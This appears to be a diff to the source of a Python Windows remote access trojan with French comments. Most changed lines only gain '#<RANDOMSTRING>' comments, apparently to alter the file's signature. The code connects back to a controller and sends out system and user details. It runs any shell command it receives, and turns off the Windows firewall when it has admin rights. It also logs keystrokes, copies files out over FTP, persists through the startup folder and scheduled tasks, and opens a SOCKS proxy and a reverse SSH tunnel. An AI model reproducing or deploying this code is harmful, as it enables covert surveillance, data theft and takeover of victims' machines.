@@ -1,90 +1,88 @@
-import socket
-import os
-import subprocess
-from ctypes import *
-import pythoncom
-import pyHook
-import ctypes
-import win32clipboard
-# import win32gui
-from win32com.makegw.makegwparse import *
+import socket #<RANDOMSTRING>
+import os #<RANDOMSTRING>
+import subprocess #<RANDOMSTRING>
+from ctypes import * #<RANDOMSTRING>
+import pythoncom #<RANDOMSTRING>
+import pyHook #<RANDOMSTRING>
+import ctypes  #<RANDOMSTRING>
+import win32clipboard #<RANDOMSTRING>
+from win32com.makegw.makegwparse import * #<RANDOMSTRING>
 import threading
-import inspect
+import inspect #<RANDOMSTRING>
 import sys
-import time
-import random
+import time #<RANDOMSTRING>
+import random #<RANDOMSTRING>
 import string
 from ftplib import FTP
-import asyncio
+import asyncio #<RANDOMSTRING>
 import pproxy
-import getpass
+import getpass #<RANDOMSTRING>
 import select
 from optparse import OptionParser
-import paramiko
-
+import paramiko #<RANDOMSTRING>
 # pour la compil
 import imp
-
-def get_or_create_eventloop():
+ #<RANDOMSTRING>
+def get_or_create_eventloop(): #<RANDOMSTRING>
     try:
-        return asyncio.get_event_loop()
+        return asyncio.get_event_loop() #<RANDOMSTRING>
     except RuntimeError as ex:
         if "There is no current event loop in thread" in str(ex):
-            loop = asyncio.new_event_loop()
+            loop = asyncio.new_event_loop() #<RANDOMSTRING>
             asyncio.set_event_loop(loop)
-            return asyncio.get_event_loop()
+            return asyncio.get_event_loop() #<RANDOMSTRING>
 
-def getString(length=6):
+def getString(length=6): #<RANDOMSTRING>
     """Générer une chaîne aléatoire de longueur fixe"""
-    str = string.ascii_lowercase
+    str = string.ascii_lowercase #<RANDOMSTRING>
     return ''.join(random.choice(str) for i in range(length))
 
-def _async_raise(tid, exctype):
+def _async_raise(tid, exctype): #<RANDOMSTRING>
     """raises the exception, performs cleanup if needed"""
-    tid = ctypes.c_long(tid)
+    tid = ctypes.c_long(tid) #<RANDOMSTRING>
     if not inspect.isclass(exctype):
-        exctype = type(exctype)
+        exctype = type(exctype) #<RANDOMSTRING>
     res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
-        tid, ctypes.py_object(exctype))
-    if res == 0:
+        tid, ctypes.py_object(exctype)) #<RANDOMSTRING>
+    if res == 0: #<RANDOMSTRING>
         raise ValueError("invalid thread id")
     elif res != 1:
         # """if it returns a number greater than one, you're in trouble,
         # and you should call it again with exc=NULL to revert the effect"""
         ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
-        raise SystemError("PyThreadState_SetAsyncExc failed")
+        raise SystemError("PyThreadState_SetAsyncExc failed") #<RANDOMSTRING>
 
 
 class Threads:
-
+ #<RANDOMSTRING>
     thread_id = 0
-    thread_name = "null"
+    thread_name = "null" #<RANDOMSTRING>
 
-    def StartThread(self, fonction, arg1="", arg2=""):
+    def StartThread(self, fonction, arg1="", arg2=""): #<RANDOMSTRING>
         if "Keylogger" in fonction:
-            thread = threading.Thread(target=keylog.Keylog, name=fonction)
+            thread = threading.Thread(target=keylog.Keylog, name=fonction) #<RANDOMSTRING>
             thread.start()
-        if "Commande" in fonction:
+        if "Commande" in fonction: #<RANDOMSTRING>
             thread = threading.Thread(
                 target=payload.Commande, name=fonction, args=(arg1,))
             thread.start()
-        if "Proxy" in fonction:
+        if "Proxy" in fonction: #<RANDOMSTRING>
             thread = threading.Thread(
                 target=payload.StartProxy, name=fonction, args=(arg1,))
             thread.start()
-        if "Tunnel" in fonction:
+        if "Tunnel" in fonction: #<RANDOMSTRING>
             thread = threading.Thread(
-                target=payload.StartTunnel, name=fonction, args=(arg1,arg2))
+                target=payload.StartTunnel, name=fonction, args=(arg1,arg2)) #<RANDOMSTRING>
             thread.start()
-        self.thread_id = thread.ident
+        self.thread_id = thread.ident #<RANDOMSTRING>
         self.thread_name = thread.name
         
-
+ #<RANDOMSTRING>
     def StopThread(self):
         print("Arret du Thread : " + self.thread_name +
-              ", numéro : " + str(self.thread_id))
+              ", numéro : " + str(self.thread_id)) #<RANDOMSTRING>
         _async_raise(self.thread_id, SystemExit)
-
+ #<RANDOMSTRING>
 
 class Payload:
 
@@ -94,57 +92,57 @@ class Payload:
     password_SSH = "passtest"
 
     SEPARATOR = "<sep>"
-    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
+    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase #<RANDOMSTRING>
 
     keylogger_mode = "null"
-
+ #<RANDOMSTRING>
     result_commande = ""
 
     appdata = os.path.expandvars("%AppData%")
-    path_keylog = appdata + "/java_logs.txt"
+    path_keylog = appdata + "/java_logs.txt" #<RANDOMSTRING>
 
     def run(self):
         inf = Info()
         ## si on a les droit admin 
-        # on desactive le parfeux
+        # on desactive le parfeux #<RANDOMSTRING>
         if inf.administrator():
             cmd = "netsh advfirewall set allprofiles state off"
             self.Commande(cmd)
         while True:
-            conn_ok = False
+            conn_ok = False #<RANDOMSTRING>
             ClientSocket = socket.socket()
-            print('Waiting for connection')
+            print('Waiting for connection') #<RANDOMSTRING>
             name = None
             while conn_ok == False:
-
+ #<RANDOMSTRING>
                 try:
-                    ClientSocket.connect((self.host, self.port))
+                    ClientSocket.connect((self.host, self.port)) #<RANDOMSTRING>
                     conn_ok = True
                 except socket.error as e:
                     print(str(e))
-                    conn_ok = False
+                    conn_ok = False #<RANDOMSTRING>
                     time.sleep(5 * 60)
-            print("Connexion Ok")
+            print("Connexion Ok") #<RANDOMSTRING>
             cwd = os.getcwd()
-            ClientSocket.send(cwd.encode())
+            ClientSocket.send(cwd.encode()) #<RANDOMSTRING>
             info = [inf.platform(), inf.public_ip(), inf.local_ip(), inf.mac_address(),
                     inf.architecture(), inf.device(), inf.username(), inf.administrator(), inf.geolocation(), inf.ipv4(inf.local_ip())]
             message = f"{info[0]}{self.SEPARATOR}{info[1]}{self.SEPARATOR}{info[2]}{self.SEPARATOR}\
             {info[3]}{self.SEPARATOR}{info[4]}{self.SEPARATOR}{info[5]}{self.SEPARATOR}{info[6]}{self.SEPARATOR}\
-            {info[7]}{self.SEPARATOR}{info[8]}{self.SEPARATOR}{info[9]}"
+            {info[7]}{self.SEPARATOR}{info[8]}{self.SEPARATOR}{info[9]}" #<RANDOMSTRING>
             ClientSocket.send(message.encode())
-
+ #<RANDOMSTRING>
             ## attend des info supplementaire
 
             try:
                 rep = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                 if rep != "RAS":
-                    name = rep
+                    name = rep #<RANDOMSTRING>
             except socket.error as e:
-                print(str(e))
+                print(str(e)) #<RANDOMSTRING>
                 break
 
-            pers = Persistance()
+            pers = Persistance() #<RANDOMSTRING>
 
             # AJOUTER LE NUMERO DE SESSION DANS LES INFO
 
@@ -152,205 +150,204 @@ class Payload:
 
             ## boucle du client ##
 
-            while True:
+            while True: #<RANDOMSTRING>
                 # receive the command from the server
                 try:
                     command = ClientSocket.recv(
                         self.BUFFER_SIZE).decode('utf-8', "ignore")
                 except socket.error as e:
-                    print(str(e))
+                    print(str(e)) #<RANDOMSTRING>
                     break
                 #command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                 splited_command = command.split()
-                print(command)
+                print(command) #<RANDOMSTRING>
                 #output = subprocess.getoutput(command)
                 # ClientSocket.send(str.encode(output))
                 if command.lower() != "cat":
-
+ #<RANDOMSTRING>
                     if splited_command[0].lower() == "cat":
-                        path_fichier = splited_command[1]
+                        path_fichier = splited_command[1] #<RANDOMSTRING>
                         output = self.Commande("type " + path_fichier)
 
                 else:
                     output = "Cat a besoin d'une option"
-
-                if len(splited_command) == 1 and splited_command[0].lower() == "proxy":
+ #<RANDOMSTRING>
+                if len(splited_command) == 1 and splited_command[0].lower() == "proxy": #<RANDOMSTRING>
                     print("Lancement du proxy sur le port par défault (9050)")
-                    self.LaunchThread("Proxy", 9050)
+                    self.LaunchThread("Proxy", 9050) #<RANDOMSTRING>
                     output = "Lancement du proxy sur le port par défault (9050)"
-                elif len(splited_command) == 2 and splited_command[0].lower() == "proxy":
+                elif len(splited_command) == 2 and splited_command[0].lower() == "proxy": #<RANDOMSTRING>
                     if splited_command[1].isnumeric():
-                        print("Lancement du proxy sur le port : " + splited_command[1])
+                        print("Lancement du proxy sur le port : " + splited_command[1]) #<RANDOMSTRING>
                         self.LaunchThread("Proxy", int(splited_command[1]))
-                        output = "Lancement du proxy sur le port : " + splited_command[1]
+                        output = "Lancement du proxy sur le port : " + splited_command[1] #<RANDOMSTRING>
                     else:
                         print("Ereur dans l'option du proxy. exemple de la commande : proxy 9050(port d'écoute du serveur proxy)")
                         output = "Ereur dans l'option du proxy. exemple de la commande : proxy 9050(port d'écoute du serveur proxy)"
-
-                if len(splited_command) == 1 and splited_command[0].lower() == "tunnel":
+ #<RANDOMSTRING>
+                if len(splited_command) == 1 and splited_command[0].lower() == "tunnel": #<RANDOMSTRING>
                     print("Ouverture du tunnel sur le port remote par défault (9051) vers le port local par défault (9050)")
                     self.LaunchThread("Tunnel", 9051, 9050)
                     output = "Ouverture du tunnel sur le port remote par défault (9051) vers le port local par défault (9050)"
-                elif len(splited_command) == 2 and splited_command[0].lower() == "tunnel":
+                elif len(splited_command) == 2 and splited_command[0].lower() == "tunnel": #<RANDOMSTRING>
                     print("Le tunnel nésaisite 2 port en option")
                     output = "Le tunnel nésaisite 2 port en option"
                     
-                elif len(splited_command) == 3 and splited_command[0].lower() == "tunnel":
+                elif len(splited_command) == 3 and splited_command[0].lower() == "tunnel": #<RANDOMSTRING>
                     if splited_command[1].isnumeric() and splited_command[2].isnumeric():
                         print("Ouverture du tunnel sur le port remote {} vers le port local {}".format(splited_command[1], splited_command[2]))
                         self.LaunchThread("Tunnel", int(splited_command[1]), int(splited_command[2]))
                         output = "Ouverture du tunnel sur le port remote {} vers le port local {}".format(splited_command[1], splited_command[2])
-                    else:
+                    else: #<RANDOMSTRING>
                         print("Ereur dans les options. exemple de la commande : tunnel 9051(entrer du tunnel) 9050 (sorti du tunnel)")
                         output = "Ereur dans les options. exemple de la commande : tunnel 9051(entrer du tunnel) 9050 (sorti du tunnel)"
 
                 elif len(splited_command) > 3 and splited_command[0].lower() == "tunnel":
                     print("Tunnel a trop d'options")
-                    output = "Tunnel a trop d'options"
+                    output = "Tunnel a trop d'options" #<RANDOMSTRING>
 
                 if command.lower() != "download":
 
-                    if splited_command[0].lower() == "download":
+                    if splited_command[0].lower() == "download": #<RANDOMSTRING>
                         #print("tentative de telechargelent de " + splited_command[1] + " " + self.host + " " + str((self.port+2)))
                         path_fichier = splited_command[1]
                         ftp = FTP('')
-                        ftp.set_pasv(True)
                         ftp.connect(self.host, (self.port+2))
                         ftp.login(user='user', passwd = '12345')
                         fichier = path_fichier
                         try:
-                            file = open(fichier, 'rb') # ici, j'ouvre le fichier ftp.py 
+                            file = open(fichier, 'rb') # ici, j'ouvre le fichier ftp.py  #<RANDOMSTRING>
                             try:
                                 ftp.storbinary('STOR '+fichier, file) # ici (où connect est encore la variable de la connexion), j'indique le fichier à envoyer
-                                output = "Fichier recupérer"
+                                output = "Fichier recupérer" #<RANDOMSTRING>
                             except:
                                 output = "Erreur le fichier n'a pas été récuperé"
                         except:
                             output = "Le fichier n'éxiste pas"
-                        file.close() # on ferme le fichier
+                        file.close() # on ferme le fichier #<RANDOMSTRING>
                 else:
-                    output = "Download a besoin d'une option"
+                    output = "Download a besoin d'une option" #<RANDOMSTRING>
 
                 if command.lower() != "upload":
 
                     if splited_command[0].lower() == "upload":
                         path_fichier = splited_command[1]
-                        ftp = FTP('')
-                        ftp.set_pasv(True)
+                        ftp = FTP('') #<RANDOMSTRING>
+                        #ftp.set_pasv(True)
                         ftp.connect(self.host, (self.port+2)) 
                         ftp.login(user='user', passwd = '12345')
                         fichier = path_fichier
-                        try:
+                        try: #<RANDOMSTRING>
                             file = open(fichier, 'wb')
                             try:
-                                ftp.retrbinary('RETR '+fichier, file.write)
+                                ftp.retrbinary('RETR '+fichier, file.write) #<RANDOMSTRING>
                                 ftp.delete(fichier)
                                 output = "Fichier uploader"
                             except:
                                 output = "Erreur le fichier n'a pas été uploader"
-                        except:
+                        except: #<RANDOMSTRING>
                             output = "Erreur le fichier ne peut pas etre ecrit sur le disque"
                         file.close() # on ferme le fichier
-                else:
+                else: #<RANDOMSTRING>
                     output = "Upload a besoin d'une option"
 
                 if command.lower() != "keylogger":
 
-                    if splited_command[0].lower() == "keylogger":
+                    if splited_command[0].lower() == "keylogger": #<RANDOMSTRING>
 
                         if splited_command[1].lower() == "run" and self.keylogger_mode != "run":
                             # run le keylogger
                             if self.keylogger_mode == "null":
-                                self.keylogger_mode = "run"
+                                self.keylogger_mode = "run" #<RANDOMSTRING>
                                 output = "Keylogger Activé"
                                 # lance un thread de keylog
-                                thread_keylog = Threads()
+                                thread_keylog = Threads() #<RANDOMSTRING>
                                 thread_keylog.StartThread("Keylogger")
-                            elif self.keylogger_mode == "stop":
+                            elif self.keylogger_mode == "stop": #<RANDOMSTRING>
                                 self.keylogger_mode = "run"
                                 output = "Keylogger Activé"
                         elif splited_command[1].lower() == "run" and self.keylogger_mode != "run":
                             output = "Keylogger déja Activé"
-
+ #<RANDOMSTRING>
                         elif splited_command[1].lower() == "status":
-                            # envoyer retour du keylogger
+                            # envoyer retour du keylogger #<RANDOMSTRING>
                             #self.keylogger_mode = "status"
                             file = open(self.path_keylog, 'r')
                             logs = file.read()
-                            file.close()
+                            file.close() #<RANDOMSTRING>
                             output = logs
 
-                        elif splited_command[1].lower() == "stop":
+                        elif splited_command[1].lower() == "stop": #<RANDOMSTRING>
                             # run le keylogger
                             self.keylogger_mode = "stop"
                             # thread_keylog.StopThread()
-                            output = "Keylogger Desactivé"
+                            output = "Keylogger Desactivé" #<RANDOMSTRING>
 
                 else:
-                    output = "Keylogger a besoin d'une option"
+                    output = "Keylogger a besoin d'une option" #<RANDOMSTRING>
 
                 if command.lower() != "persistance":
 
-                    if splited_command[0].lower() == "persistance":
+                    if splited_command[0].lower() == "persistance": #<RANDOMSTRING>
 
-                        if splited_command[1].lower() == "auto":
+                        if splited_command[1].lower() == "auto": #<RANDOMSTRING>
                             print("Persistance automatique")
                             output = "Persistance automatique"
 
-                        elif splited_command[1].lower() == "startup":
+                        elif splited_command[1].lower() == "startup": #<RANDOMSTRING>
                             result, code = pers._add_startup_file()
                             if result == False and code == "deja mise":
-                                print("Persistance via dossier startup déja activé")
+                                print("Persistance via dossier startup déja activé") #<RANDOMSTRING>
                                 output = "Persistance via dossier startup déja activé"
-                            if result == False and code == "error":
+                            if result == False and code == "error": #<RANDOMSTRING>
                                 print(
                                     "Persistance via dossier startup a rencontrer une erreur")
-                                output = "Persistance via dossier startup a rencontrer une erreur"
+                                output = "Persistance via dossier startup a rencontrer une erreur" #<RANDOMSTRING>
                             if result == True:
-                                print("Persistance via dossier startup activé")
+                                print("Persistance via dossier startup activé") #<RANDOMSTRING>
                                 output = "Persistance via dossier startup activé"
-
+ #<RANDOMSTRING>
                         elif splited_command[1].lower() == "powershell":
                             print("Persistance via powershell")
-                            output = "Persistance via powershell"
-
+                            output = "Persistance via powershell" #<RANDOMSTRING>
+ #<RANDOMSTRING>
                         elif splited_command[1].lower() == "task":
                             print("Persistance via tache planifié")
-                            print(name)
+                            print(name) #<RANDOMSTRING>
                             if name == None:
                                 result, code = pers._add_scheduled_task()
                             else:
-                                result, code = pers._add_scheduled_task(name=name)
+                                result, code = pers._add_scheduled_task(name=name) #<RANDOMSTRING>
                             if result == True:
-                                print("Persistance via tache planifié activé")
+                                print("Persistance via tache planifié activé") #<RANDOMSTRING>
                                 output = "Persistance tache planifié activé" + code
-                                name = code
+                                name = code #<RANDOMSTRING>
                                 print(code)
-                            if result == False:
+                            if result == False: #<RANDOMSTRING>
                                 print(
-                                    "Persistance via tache planifié a rencontrer une erreur")
+                                    "Persistance via tache planifié a rencontrer une erreur") #<RANDOMSTRING>
                                 output = "Persistance tache planifié a rencontrer une erreur : " + code
 
-                else:
+                else: #<RANDOMSTRING>
                     output = "Persistance a besoin d'une option"
 
-                if command.lower() == "kill":
+                if command.lower() == "kill": #<RANDOMSTRING>
                     # si la commande est kill, ferme le programmes
                     os._exit(0)
-                if splited_command[0].lower() == "cd":
+                if splited_command[0].lower() == "cd": #<RANDOMSTRING>
                     # cd command, change directory
                     try:
                         os.chdir(' '.join(splited_command[1:]))
                     except FileNotFoundError as e:
-                        # if there is an error, set as the output
+                        # if there is an error, set as the output #<RANDOMSTRING>
                         output = str(e)
                     else:
-                        # if operation is successful, empty message
+                        # if operation is successful, empty message #<RANDOMSTRING>
                         output = ""
                 elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance" \
                     and splited_command[0].lower() != "cat" and splited_command[0].lower() != "download" \
                         and splited_command[0].lower() != "upload" and splited_command[0].lower() != "proxy" \
-                            and splited_command[0].lower() != "tunnel":
+                            and splited_command[0].lower() != "tunnel": #<RANDOMSTRING>
                     # execute the command and retrieve the results
 
                     """
@@ -359,7 +356,7 @@ class Payload:
                     thread.join()
                     """
 
-                    output = self.Commande(command)
+                    output = self.Commande(command) #<RANDOMSTRING>
 
                     print("commande effectuer")
                     """"
@@ -368,12 +365,12 @@ class Payload:
                     output = output.decode('cp850')
                     """
 
-                # get the current working directory as output
+                # get the current working directory as output #<RANDOMSTRING>
                 cwd = os.getcwd()
                 # send the results back to the server
-                message = f"{output}{self.SEPARATOR}{cwd}"
+                message = f"{output}{self.SEPARATOR}{cwd}" #<RANDOMSTRING>
                 ClientSocket.send(message.encode('utf-8'))
-                print("Resultat Envoyer")
+                print("Resultat Envoyer") #<RANDOMSTRING>
 
                 #Input = input('Say Something: ')
                 # ClientSocket.send(str.encode(Input))
@@ -381,56 +378,56 @@ class Payload:
                 # print(Response.decode('utf-8'))
 
             ## Fin de Connection ##
-
+ #<RANDOMSTRING>
             ClientSocket.close()
 
-    def LaunchThread(self, fonction, arg1="", arg2=""):
+    def LaunchThread(self, fonction, arg1="", arg2=""): #<RANDOMSTRING>
         print(fonction)
         t = Threads()
         t.StartThread(fonction, arg1, arg2)
         return t
-
+ #<RANDOMSTRING>
     def Commande(self, cmd):
         resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
         output, err = resCmd.communicate()
-        output = output.decode('cp850')
+        output = output.decode('cp850') #<RANDOMSTRING>
         payload.result_commande = output
-        return output
+        return output #<RANDOMSTRING>
 
     def StartProxy(self, port):
         ADDR = "0.0.0.0"
-        PORT = port
+        PORT = port #<RANDOMSTRING>
 
         server = pproxy.Server('http+socks4+socks5://{}:{}'.format(ADDR ,str(PORT)))
-        remote = pproxy.Connection('direct')
+        remote = pproxy.Connection('direct') #<RANDOMSTRING>
         args = dict( rserver = [remote],
-                    verbose = print )
+                    verbose = print ) #<RANDOMSTRING>
 
         loop = get_or_create_eventloop()
-        handler = loop.run_until_complete(server.start_server(args))
+        handler = loop.run_until_complete(server.start_server(args)) #<RANDOMSTRING>
         try:
             print("Lancement du serveur proxy sur : {}:{}".format(ADDR ,str(PORT)))
-            loop.run_forever()
+            loop.run_forever() #<RANDOMSTRING>
         except KeyboardInterrupt:
             print('exit!')
-
+ #<RANDOMSTRING>
         handler.close()
         loop.run_until_complete(handler.wait_closed())
         loop.run_until_complete(loop.shutdown_asyncgens())
-        loop.close()
+        loop.close() #<RANDOMSTRING>
 
     def StartTunnel(self, port_entrer, port_sorti):
 
-        SSH_PORT = 22
+        SSH_PORT = 22 #<RANDOMSTRING>
         DEFAULT_PORT = port_entrer
 
         g_verbose = True
-
+ #<RANDOMSTRING>
 
         def handler(chan, host, port):
             sock = socket.socket()
-            try:
+            try: #<RANDOMSTRING>
                 sock.connect((host, port))
             except Exception as e:
                 verbose("Forwarding request to %s:%d failed: %r" % (host, port, e))
@@ -438,31 +435,31 @@ class Payload:
 
             verbose(
                 "Connected!  Tunnel open %r -> %r -> %r"
-                % (chan.origin_addr, chan.getpeername(), (host, port))
+                % (chan.origin_addr, chan.getpeername(), (host, port)) #<RANDOMSTRING>
             )
             while True:
                 r, w, x = select.select([sock, chan], [], [])
-                if sock in r:
+                if sock in r: #<RANDOMSTRING>
                     data = sock.recv(1024)
                     if len(data) == 0:
-                        break
+                        break #<RANDOMSTRING>
                     chan.send(data)
                 if chan in r:
-                    data = chan.recv(1024)
+                    data = chan.recv(1024) #<RANDOMSTRING>
                     if len(data) == 0:
                         break
                     sock.send(data)
             chan.close()
-            sock.close()
+            sock.close() #<RANDOMSTRING>
             verbose("Tunnel closed from %r" % (chan.origin_addr,))
 
 
-        def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
+        def reverse_forward_tunnel(server_port, remote_host, remote_port, transport): #<RANDOMSTRING>
             transport.request_port_forward("", server_port)
             while True:
                 chan = transport.accept(1000)
                 if chan is None:
-                    continue
+                    continue #<RANDOMSTRING>
                 thr = threading.Thread(
                     target=handler, args=(chan, remote_host, remote_port)
                 )
